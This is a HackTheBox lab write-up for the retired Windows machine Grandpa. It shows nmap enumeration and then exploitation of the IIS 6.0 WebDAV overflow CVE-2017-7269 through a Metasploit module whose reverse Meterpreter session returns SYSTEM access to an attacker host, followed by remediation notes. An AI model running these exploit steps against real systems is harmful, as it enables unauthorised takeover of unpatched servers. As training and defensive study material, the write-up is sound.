HTB Grandpa: IIS 6 WebDAV overflow straight to SYSTEM

retired-machineeasy

Grandpa is a retired HackTheBox easy Windows machine that teaches version-driven exploitation at its purest. Synopsis: Microsoft IIS 6.0 on Windows Server 2003, one public buffer overflow (CVE-2017-7269), from version string to SYSTEM in a single exploit.

$ Enumeration — Nmap

# nmap: confirm IIS 6.0 on 2003
nmap -sC -sV -oN grandpa.nmap 10.10.10.14

IIS 6.0 on Server 2003 with WebDAV enabled. Confirm the version, match the CVE, exploit — a stack this old has a flagship public exploit as curriculum.

$ Exploitation — WebDAV overflow (CVE-2017-7269)

# msfconsole: webdav_scstoragepathfromurl
msfconsole -q
msf6 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf6 exploit(iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
msf6 exploit(iis_webdav_scstoragepathfromurl) > set LHOST 10.10.14.23
msf6 exploit(iis_webdav_scstoragepathfromurl) > run
[*] Meterpreter session 1 opened as NT AUTHORITY\SYSTEM

A crafted PROPFIND/PROPPATCH with an overlong If header overflows ScStoragePathFromUrl and hijacks execution. The IIS worker context yields SYSTEM directly — user.txt and root.txt both fall in the single session. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Fuzzing the website for injection first (the site is static decoration — the service version is the vulnerability) and doubting a 2017 CVE on a 2003 box (unpatched legacy is exactly where old exploits live forever).

$ Remediation notes

Retire Server 2003 and IIS 6 entirely, disable WebDAV where unused, and treat any IIS 6 banner on a scan as a critical finding on sight. Written by Lucky Thandel.
